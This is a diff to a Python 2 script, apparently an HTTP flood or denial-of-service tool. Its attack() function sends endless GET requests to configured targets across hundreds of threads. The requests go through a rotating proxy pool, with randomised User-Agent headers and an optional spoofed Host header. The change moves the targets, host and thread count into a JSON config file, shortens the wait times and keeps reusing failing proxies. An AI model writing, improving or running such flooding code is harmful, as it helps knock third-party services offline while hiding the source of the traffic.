@@ -9,23 +9,34 @@ import sys
 import useragenthelper
 from requests import ConnectionError
 from proxyhelper import ProxyHelper
+import json
 
 pool = proxypool.ProxyPool.get_instance()
-g_lst_target = ['http://']
-g_thread = 400
+g_lst_target = []
+g_target_host = None
+g_thread = 10
+
+r = open("config.txt").read()
+js = json.loads(r)
+g_lst_target = js['target']
+g_target_host = js['host']
+g_thread = js['thread']
 
 if g_thread > 600:
     g_thread = 600
 elif g_thread == 0:
     g_thread = 1
     #python win limited
-print 'thread = %s' % g_thread
-
+    
 if len(g_lst_target) == 0:
     print 'Target null please set target'
     raw_input('Print any key to Exit')
     exit(1)
 
+print 'Ver 0.1'
+print 'target %s' % (g_lst_target)
+print 'host %s' % (g_target_host)
+print 'thread %s' % (g_thread)
 
 def attack():
     global pool
@@ -34,7 +45,7 @@ def attack():
     while proxy is None:
         proxy = pool.pop()
         time.sleep(10)
-    time.sleep(10)
+    time.sleep(5)
     while True:
         try:
             put = 1
@@ -42,10 +53,14 @@ def attack():
             proxies = {'http': 'http://%s:%s' % (proxy.ip, proxy.port)}
             s = requests.Session()
             headers = {'User-Agent': useragenthelper.get()}
+            if g_target_host is not None:
+                if len(g_target_host)>0:
+                    headers['Host'] = g_target_host
             r = s.get(target, timeout=2, headers=headers, proxies=proxies)
-            print r
+            print r.text
         except ConnectionError:
-            put = 0
+            #put = 0
+            pass
         except:
             print 'Request Failed'
             #import traceback
